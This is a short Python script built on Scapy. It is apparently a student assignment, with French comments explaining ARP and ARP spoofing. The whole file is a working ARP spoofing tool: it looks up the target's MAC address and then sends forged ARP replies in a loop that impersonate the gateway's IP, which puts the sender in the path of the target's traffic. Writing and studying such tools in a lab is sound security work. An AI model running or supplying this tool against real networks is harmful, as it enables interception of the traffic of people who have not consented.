# shmouel abergel 1447438
# yechoua benchimol 1582867
# arp permet la conversion IP-MAC 
# grace a la connaissance de l'ip on envoie en broadcast un arp request
# pour savoir qui possede cette ip et la machine qui possede cette ip repond en envoyant son adresse mac
# arp spoofing permet de recevoir les request et de ce faire passer pour cette ip en envoyant en reponse notre mac>

from scapy.all import *

import argparse

from scapy.layers.l2 import ARP, Ether


#recuperer l'addresse mac de la machine attaqué en lui envoyant un arp request
def find_mac(address):
    ans, unans = arping(address, verbose=0)
    for s, r in ans:
        return r[ARP].hwsrc
    return None


def spoofing(target, src, delay):
    try:
        packet = (Ether(dst=dst_mac) /
        ARP(op="is-at", psrc=src, hwdst=dst_mac, pdst=target))
        sendp(packet, iface=iface,loop = 1,inter= float(delay), verbose=1)
    except KeyboardInterrupt:
        print("ERROR")


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    global  dst_mac
    parser.add_argument("-i", "--iface", default=conf.iface, help="set the interface that you use")
    parser.add_argument("-s", "--src", default=conf.route.route("0.0.0.0")[2], help="set the source ip")
    parser.add_argument("-d", "--delay", default="0.4", help="set the delay in seconds")
    parser.add_argument("-t", "--target", default="None", required=True, help="set the target id")
    args = parser.parse_args()

    target = args.target
    iface = args.iface
    delay = args.delay
    src = args.src

    dst_mac = find_mac(target)
    spoofing(target, src, delay)
    

                  
